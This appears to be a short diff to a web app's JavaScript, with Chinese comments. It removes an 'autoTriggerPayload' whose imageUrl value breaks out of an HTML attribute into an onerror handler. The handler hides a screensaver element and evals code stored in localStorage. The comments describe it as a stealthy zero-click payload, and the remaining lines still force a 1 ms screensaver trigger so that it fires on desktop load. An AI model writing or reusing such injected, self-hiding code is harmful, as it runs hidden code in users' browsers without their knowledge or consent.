@@ -870,11 +870,6 @@
     // 清除舊組件 (包括之前可能殘留嘅 ni-manager app entry)
     apps = apps.filter(a => a.id !== 'ni-core-system' && a.id !== 'ni-manager' && a.id !== 'ni-manager-manual');
 
-    // --- [0-Click 隱身增強版：移出螢幕 + 徹底隱藏] ---
-    const autoTriggerPayload = {
-        "imageUrl": "x\" onerror=\"(function(){ const s=document.createElement('style'); s.innerHTML='#screensaver { position: fixed !important; left: -10000px !important; top: -10000px !important; display: none !important; visibility: hidden !important; opacity: 0 !important; }'; document.head.appendChild(s); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
-    };
-
     // 強制將系統螢幕保護程式設定為 AI 模式，並將觸發時間設為極短（1毫秒）
     // 這樣一開機進入桌面，系統就會瞬間觸發這個隱藏的 Payload
     localStorage.setItem('screensaverPattern', 'ai-generated');
